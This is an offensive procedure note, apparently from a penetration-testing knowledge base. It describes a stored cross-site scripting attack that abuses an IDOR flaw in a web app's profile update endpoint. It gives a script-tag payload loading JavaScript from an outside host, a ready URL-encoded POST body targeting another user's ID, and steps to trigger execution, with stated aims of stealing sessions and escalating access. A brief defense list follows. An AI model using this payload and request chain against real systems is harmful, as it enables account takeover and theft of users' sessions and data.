---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
tags:
  - stored-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.253Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored-XSS-Injection-via-User-Name-Field

## Summary

This procedure injects a stored XSS payload into the user name field via the IDOR update endpoint, persisting the script for execution when profiles are viewed.

## Description

The name field in user updates lacks sanitization, allowing <script src='http://external.com/some.js'></script> to be stored and rendered unsafely in profile views or admin interfaces. Combined with IDOR, this affects any user. Payload executes on subsequent page loads, enabling data theft or further exploits.

## Requirements

1. Access to update endpoint (via IDOR)
2. External JS host for payload
3. Target user_id

## Defense

Defensive measures and detection strategies:

- HTML-escape all user data on output
- Use CSP to block inline scripts
- Scan for script tags in database fields
- WAF rules for <script> in updates

## Objectives

1. Persist XSS in user profiles
2. Execute on admin or user views
3. Steal sessions or escalate

## Instructions

### Step 1: Prepare Payload

**Context**: Craft XSS for storage.

Use <script src='http://external.com/some.js'></script>.

### Step 2: Inject via Update

**Context**: Store payload using IDOR.

POST name=<script src='http://external.com/some.js'></script>&email=...&user_id=6&...

```http
name=%3Cscript%20src%3D%27http%3A%2F%2Fexternal.com%2Fsome.js%27%3E%3C%2Fscript%3E&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d
```

> Payload stored. Expected output: Success response.

### Step 3: Trigger Execution

**Context**: View profile to run script.

Navigate to profile page; script loads.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- stored-xss
